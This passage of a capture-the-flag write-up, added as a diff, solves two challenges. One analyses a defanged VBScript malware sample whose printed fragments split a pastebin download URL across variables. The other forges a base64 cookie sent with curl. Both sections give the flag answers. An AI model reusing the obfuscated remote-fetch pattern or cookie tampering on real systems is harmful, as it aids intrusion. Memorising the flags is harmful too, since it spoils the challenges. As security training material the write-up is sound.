@@ -1119,3 +1119,69 @@ FLAG{97F33C9783C21DF85D79D613B0B258BD}
 ```
 
 FYI: Similer CTF Writeup: [CTFtime.org / Hacktober CTF / Prefetch Perfection / Writeup](https://ctftime.org/writeup/24252)
+
+## VeeBeeEee
+
+### Description
+
+> While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?
+>
+> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
+>
+> Download the file(s) below.
+>
+> Attachments: veebeeeee
+
+### Flag
+
+flag{ed81d24958127a2adccfb343012cebff}
+
+### Solution
+
+I guess `veebeeeee` is a .vbe (VBScript) file.
+
+1. rename veebeeeee to veebeeeee.vbe
+2. upload it to <https://master.ayra.ch/vbs/vbs.aspx> to decrypt and download veebeeeee.vbs
+
+```console
+$ cat veebeeeee.vbs | sed -e 's/&//g'
+(snip)
+Reqest1 = "https://past"''''''''''''''''al37ysoeopm'al37ysoeopm
+Reqest2 = "ebin.com/raw"''''''''''''''''al37ysoeopm'al37ysoeopm
+Reqest3 = "/SiYGwwcz"''''''''''''''''al37ysoeopm'al37ysoeopm
+Reqest4 = "' -ou"''''''''''''''''al37ysoeopm'al37ysoeopm
+(snip)
+```
+
+Concatenated `Reqest1`, `Reqest2` and `Reqest3` variables, Got `https://pastebin.com/raw/SiYGwwcz` URL.
+
+```console
+$ curl https://pastebin.com/raw/SiYGwwcz
+<!-- flag{ed81d24958127a2adccfb343012cebff} -->
+```
+
+## Baking
+
+### Description
+
+> Do you know how to make cookies? How about HTTP flavored?
+>
+> Press the Start button in the top-right to begin this challenge.
+>
+> Connect with:
+>
+> <http://chal.ctf.games:30484>
+
+### Flag
+
+flag{c36fb6ebdbc2c44e6198bf4154d94ed4}
+
+### Solution
+
+```console
+root@kali:~/ctf/HuntressCTF# echo -ne '{"recipe": "Magic Cookies", "time": "1/1/2000, 00:00:00"}' | base64
+eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEvMS8yMDAwLCAwMDowMDowMCJ9
+
+root@kali:~/ctf/HuntressCTF# curl -i -s -k -b $'in_oven=eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEvMS8yMDAwLCAwMDowMDowMCJ9' $'http://chal.ctf.games:30484/' | grep -Eo 'flag\{[0-9a-f]{32}\}'
+flag{c36fb6ebdbc2c44e6198bf4154d94ed4}
+```
